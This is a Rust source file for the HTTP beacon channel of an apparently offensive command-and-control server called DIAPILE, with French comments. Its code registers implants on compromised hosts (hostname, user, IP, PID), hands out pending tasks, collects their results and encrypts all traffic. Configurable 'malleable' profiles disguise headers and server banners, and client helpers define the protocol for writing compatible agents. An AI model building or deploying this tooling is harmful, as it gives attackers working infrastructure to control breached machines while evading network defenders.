//! DIAPILE C2 — Canal HTTP (polling beacon)
//!
//! **SÉCURITÉ OBLIGATOIRE** : toutes les communications sont chiffrées AES-256-GCM
//! (nonce 96-bit aléatoire par message) et authentifiées mutuellement via
//! HMAC-SHA256 anti-replay ±5 minutes. Clé partagée via env `C2_SHARED_KEY`.
//!
//! Wire format body (chiffré) : `[12B nonce][ciphertext + 16B tag]`
//! Headers obligatoires (hors /health) :
//!   X-C2-Timestamp     : epoch secondes UNIX UTC
//!   X-C2-HMAC-SHA256   : HMAC(method\npath\nts\nsha256(body_ciphertext))
#![allow(dead_code)]

use super::agent::{Agent, AgentConfig, AgentStatus, C2Server, TaskResult};
use super::crypto::{
    aes_gcm_decrypt, aes_gcm_encrypt, compute_hmac, load_channel_key, verify_c2_request, C2Channel,
    ReplayCache,
};
use super::MalleableProfile;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::SystemTime;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

pub struct HttpC2 {
    pub server: Arc<C2Server>,
    key: [u8; 32],
    replay: Arc<ReplayCache>,
    pub profile: MalleableProfile,
}

impl HttpC2 {
    /// Crée un nouveau serveur HTTP C2.
    /// Échoue si `C2_MASTER_KEY` (64 hex) est absente de l'environnement.
    /// La clé de chiffrement est DÉRIVÉE par canal (HKDF) : `c2/http/channel-01`.
    pub fn new(server: Arc<C2Server>) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let key = load_channel_key(C2Channel::Http)?;
        Ok(Self {
            server,
            key,
            replay: Arc::new(ReplayCache::new()),
            profile: MalleableProfile::default(),
        })
    }

    /// Lance le listener HTTP C2.
    pub async fn start(
        &self,
        bind_addr: &str,
        bind_port: u16,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let addr = format!("{}:{}", bind_addr, bind_port);
        let listener = TcpListener::bind(&addr).await?;
        let srv = self.server.clone();
        let key = self.key;
        let replay = self.replay.clone();

        println!(
            "\n  \x1b[38;5;196m[C2-HTTP]\x1b[0m Listener sur \x1b[33mhttps?://{}\x1b[0m  (AES-256-GCM + HMAC-SHA256)",
            addr
        );
        println!(
            "  \x1b[90mEndpoints: /health  POST /checkin  GET /tasks/:id  POST /result/:id\x1b[0m"
        );
        println!("  \x1b[90mHeaders:   X-C2-Timestamp (epoch)  X-C2-HMAC-SHA256\x1b[0m\n");

        loop {
            let (stream, _) = listener.accept().await?;
            let srv_clone = srv.clone();
            let replay_clone = replay.clone();
            let profile_clone = self.profile.clone();
            let key_clone = key;

            tokio::spawn(async move {
                handle_c2_request(stream, srv_clone, key_clone, replay_clone, profile_clone).await;
            });
        }
    }
}

async fn handle_c2_request(
    mut stream: tokio::net::TcpStream,
    server: Arc<C2Server>,
    key: [u8; 32],
    replay: Arc<ReplayCache>,
    profile: MalleableProfile,
) {
    let mut buf = vec![0u8; 65536];
    let n = match tokio::time::timeout(std::time::Duration::from_secs(5), stream.read(&mut buf))
        .await
    {
        Ok(Ok(n)) => n,
        _ => return,
    };

    let raw = String::from_utf8_lossy(&buf[..n]).to_string();
    let (headers_map, method, path, body_bytes) = match parse_http(&raw) {
        Some(x) => x,
        None => {
            let _ = write_http_error(&mut stream, 400, "bad request", &profile).await;
            return;
        }
    };

    // Malleable C2: lookup headers from profile mapping
    let ts_header = profile
        .custom_headers
        .get("X-C2-Timestamp")
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_else(|| "x-c2-timestamp".to_string());
    let hmac_header = profile
        .custom_headers
        .get("X-C2-HMAC-SHA256")
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_else(|| "x-c2-hmac-sha256".to_string());

    let ts = headers_map.get(&ts_header).map(|s| s.as_str());
    let hmac = headers_map.get(&hmac_header).map(|s| s.as_str());

    // /health = debug non authentifié (réseau up / TLS enrobage OK)
    if method == "GET" && path == "/health" {
        let _ = write_http_plain(&mut stream, 200, "{}", &profile).await;
        return;
    }

    // Vérification crypto obligatoire sur toutes les autres routes
    if let Err((s, body)) = verify_c2_request(&replay, &key, &method, &path, ts, hmac, &body_bytes)
    {
        let _ = write_http_plain(&mut stream, s, &body, &profile).await;
        return;
    }

    // Déchiffrement body ciphertext → plaintext JSON
    let body_plain: String = if !body_bytes.is_empty() {
        match aes_gcm_decrypt(&key, &body_bytes) {
            Ok(bytes) => match String::from_utf8(bytes) {
                Ok(s) => s,
                Err(_) => {
                    let _ =
                        write_http_error(&mut stream, 400, "utf8 invalide post-decrypt", &profile)
                            .await;
                    return;
                }
            },
            Err(_) => {
                let _ = write_http_error(&mut stream, 400, "decrypt AES échoué", &profile).await;
                return;
            }
        }
    } else {
        String::new()
    };

    let (status, response_plain) = match (method.as_str(), path.as_str()) {
        ("POST", p) if p == profile.checkin_endpoint => handle_checkin(&body_plain, &server).await,
        ("GET", p) if p.starts_with(&profile.task_endpoint) => {
            let agent_id = p.trim_start_matches(&profile.task_endpoint);
            handle_get_tasks(agent_id, &server).await
        }
        ("POST", p) if p.starts_with("/result/") => {
            let agent_id = p.trim_start_matches("/result/");
            handle_post_result(agent_id, &body_plain, &server).await
        }
        _ => (404, "{\"error\":\"not found\",\"code\":404}".to_string()),
    };

    // Réponse : chiffrement → HTTP write ciphertext bytes
    let resp_ct = match aes_gcm_encrypt(&key, response_plain.as_bytes()) {
        Ok(ct) => ct,
        Err(_) => {
            let _ = write_http_error(&mut stream, 500, "encrypt réponse échoué", &profile).await;
            return;
        }
    };
    let _ = write_http_bytes(&mut stream, status, &resp_ct, &profile).await;
}

// ── Handlers métier (plaintext déjà garanti) ─────────────────────────────────

async fn handle_checkin(body: &str, server: &Arc<C2Server>) -> (u16, String) {
    if let Ok(data) = serde_json::from_str::<serde_json::Value>(body) {
        let id = data["id"].as_str().unwrap_or("unknown").to_string();
        let hostname = data["hostname"].as_str().unwrap_or("?").to_string();
        let username = data["username"].as_str().unwrap_or("?").to_string();
        let os = data["os"].as_str().unwrap_or("?").to_string();
        let ip = data["ip"].as_str().unwrap_or("?").to_string();
        let arch = data["arch"].as_str().unwrap_or("x64").to_string();
        let pid = data["pid"].as_u64().unwrap_or(0) as u32;

        let now = Utc::now().to_rfc3339();
        let agent = Agent {
            id: id.clone(),
            hostname,
            username,
            os,
            ip,
            arch,
            pid,
            status: AgentStatus::Active,
            config: AgentConfig::default(),
            first_seen: now.clone(),
            last_checkin: now,
            tasks: Vec::new(),
            task_results: Vec::new(),
        };

        server.register_agent(agent).await;
        (
            200,
            format!("{{\"id\":\"{}\",\"sleep\":60,\"jitter\":0.3}}", id),
        )
    } else {
        (500, "{\"error\":\"invalid json\",\"code\":500}".to_string())
    }
}

async fn handle_get_tasks(agent_id: &str, server: &Arc<C2Server>) -> (u16, String) {
    let tasks = server.get_pending_tasks(agent_id).await;
    let json = serde_json::to_string(&tasks).unwrap_or_else(|_| "[]".to_string());
    (200, json)
}

async fn handle_post_result(agent_id: &str, body: &str, server: &Arc<C2Server>) -> (u16, String) {
    if let Ok(result) = serde_json::from_str::<TaskResult>(body) {
        server.submit_result(agent_id, result).await;
        (200, "{\"status\":\"ok\"}".to_string())
    } else {
        (
            500,
            "{\"error\":\"invalid result\",\"code\":500}".to_string(),
        )
    }
}

// ── HTTP helpers ────────────────────────────────────────────────────────────

/// Parse HTTP minimal: method + path + headers (lowercase keys) + raw body bytes.
/// Retourne None si format invalide.
fn parse_http(raw: &str) -> Option<(HashMap<String, String>, String, String, Vec<u8>)> {
    // Séparateur header/body exact
    let (header_block, body_block) = raw.split_once("\r\n\r\n")?;
    let mut lines = header_block.lines();
    let first = lines.next()?;
    let mut parts = first.split_whitespace();
    let method = parts.next()?.to_string();
    let path = parts.next()?.to_string();

    let mut headers = HashMap::new();
    for l in lines {
        if let Some((k, v)) = l.split_once(':') {
            headers.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
        }
    }
    // Content-Length pour tronquer body exact
    let cl = headers
        .get("content-length")
        .and_then(|s| s.parse::<usize>().ok())
        .unwrap_or(body_block.len());
    let body_bytes: Vec<u8> = body_block.bytes().take(cl).collect();
    Some((headers, method, path, body_bytes))
}

async fn write_http_bytes(
    stream: &mut tokio::net::TcpStream,
    status: u16,
    body: &[u8],
    profile: &MalleableProfile,
) -> std::io::Result<()> {
    let status_txt = match status {
        200 => "200 OK",
        400 => "400 Bad Request",
        401 => "401 Unauthorized",
        404 => "404 Not Found",
        _ => "500 Internal Server Error",
    };
    let head = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {len}\r\nServer: {server}\r\nConnection: close\r\n\r\n",
        status = status_txt,
        content_type = profile.response_content_type,
        len = body.len(),
        server = profile.server_header
    );
    stream.write_all(head.as_bytes()).await?;
    stream.write_all(body).await?;
    Ok(())
}

async fn write_http_plain(
    stream: &mut tokio::net::TcpStream,
    status: u16,
    body: &str,
    profile: &MalleableProfile,
) -> std::io::Result<()> {
    let status_txt = match status {
        200 => "200 OK",
        400 => "400 Bad Request",
        401 => "401 Unauthorized",
        404 => "404 Not Found",
        _ => "500 Internal Server Error",
    };
    let resp = format!(
        "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {len}\r\nServer: {server}\r\nConnection: close\r\n\r\n{body}",
        status = status_txt,
        len = body.len(),
        server = profile.server_header,
        body = body
    );
    stream.write_all(resp.as_bytes()).await
}

async fn write_http_error(
    stream: &mut tokio::net::TcpStream,
    status: u16,
    msg: &str,
    profile: &MalleableProfile,
) -> std::io::Result<()> {
    let body = format!(
        "{{\"error\":\"{}\",\"code\":{}}}",
        msg.replace('"', "\\\""),
        status
    );
    write_http_plain(stream, status, &body, profile).await
}

// ── Client-side helpers (construit requêtes C2 valides côté agent) ──────────
// Ces helpers ne servent PAS au serveur; ils fournissent la spec client à qui
// veut écrire un agent compatible DIAPILE.

/// Génère les headers HTTP C2 + body ciphertext pour une requête agent.
/// (Fonction utilitaire — non appelée par le serveur C2 lui-même.)
#[allow(dead_code)]
pub fn build_agent_request(
    key: &[u8; 32],
    method: &str,
    path: &str,
    plaintext_body: &[u8],
) -> Result<(HashMap<&'static str, String>, Vec<u8>), Box<dyn std::error::Error + Send + Sync>> {
    let ts = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)?
        .as_secs();
    let ciphertext = aes_gcm_encrypt(key, plaintext_body)?;
    let hmac = compute_hmac(key, method, path, ts, &ciphertext);
    let mut h = HashMap::new();
    h.insert("X-C2-Timestamp", ts.to_string());
    h.insert("X-C2-HMAC-SHA256", hmac);
    Ok((h, ciphertext))
}

#[cfg(test)]
mod tests {
    use super::*;
    use rand::RngCore;

    fn random_key() -> [u8; 32] {
        let mut k = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut k);
        k
    }

    #[test]
    fn c2_dns_roundtrip_via_crypto_module_format() {
        // Vérifie que le format AES wire est cohérent avec dns_c2.rs
        // (partagé via le module crypto — intégration serveur ↔ agent)
        let k = random_key();
        let pt = b"whoami";
        let ct = aes_gcm_encrypt(&k, pt).unwrap();
        assert_eq!(&aes_gcm_decrypt(&k, &ct).unwrap(), pt);
    }

    #[test]
    fn http_build_and_verify_roundtrip() {
        let k = random_key();
        let replay = ReplayCache::new();
        let (headers, body_ct) =
            build_agent_request(&k, "POST", "/checkin", br#"{"id":"x","hostname":"t"}"#).unwrap();
        let ts = headers.get("X-C2-Timestamp").map(|s| s.as_str());
        let hm = headers.get("X-C2-HMAC-SHA256").map(|s| s.as_str());
        assert!(
            verify_c2_request(&replay, &k, "POST", "/checkin", ts, hm, &body_ct).is_ok(),
            "verify doit réussir sur requête bienformée"
        );
        // Falsification path → doit échouer
        assert!(
            verify_c2_request(&replay, &k, "POST", "/BADPATH", ts, hm, &body_ct).is_err(),
            "path faux doit rejeter"
        );
    }
}
